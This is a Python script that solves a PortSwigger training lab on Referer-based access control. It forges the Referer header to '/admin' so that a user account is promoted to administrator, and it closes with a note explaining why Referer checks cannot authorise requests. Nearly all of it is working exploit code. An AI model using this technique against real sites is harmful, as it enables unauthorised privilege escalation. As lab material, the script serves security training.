# Lab 13 — Referer-based access control
# PortSwigger: https://portswigger.net/web-security/access-control/lab-referer-based-access-control
#
# Vulnerability: Admin functionality is gated by checking whether the Referer
#                header points to /admin, instead of verifying the session's
#                actual role server-side
# Aim:           Forge the Referer header to promote your own account to admin
#
# Technique:
#   The role-upgrade endpoint checks: "did this request's Referer come from
#   the admin page?" The Referer header is fully client-controlled — set it
#   manually to the expected admin page URL, regardless of where you actually
#   navigated from.
#
# Usage: python access_control_lab13.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 13 — REFERER-BASED ACCESS CONTROL BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab13.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm the request is blocked with a normal Referer ────────
    print("\n  ── Step 1: attempt role upgrade with the browser's natural Referer\n")
    r_blocked = session.get(
        f"{url}/admin-roles",
        params={"username": "wiener", "action": "upgrade"},
        headers={"Referer": f"{url}/my-account"}
    )
    check_status(r_blocked, [401, 403], "Role upgrade with non-admin Referer")

    # ── Step 2: forge the Referer to look like it came from /admin ──────────
    print("\n  ── Step 2: forge Referer to point at /admin and retry\n")
    r_bypass = session.get(
        f"{url}/admin-roles",
        params={"username": "wiener", "action": "upgrade"},
        headers={"Referer": f"{url}/admin"}
    )
    check_status(r_bypass, 200, "Role upgrade with forged /admin Referer")

    # ── Step 3: verify escalation ──────────────────────────────────────────────
    print("\n  ── Step 3: verify by accessing /admin\n")
    r_admin = session.get(f"{url}/admin")
    check_status(r_admin, 200, "Access to /admin after Referer bypass")

    print()
    print("  ℹ  Referer is just a header the CLIENT sends — exactly as forgeable")
    print("     as a cookie or any other request field. Never use it for")
    print("     authorization decisions; it proves nothing about who you are.")
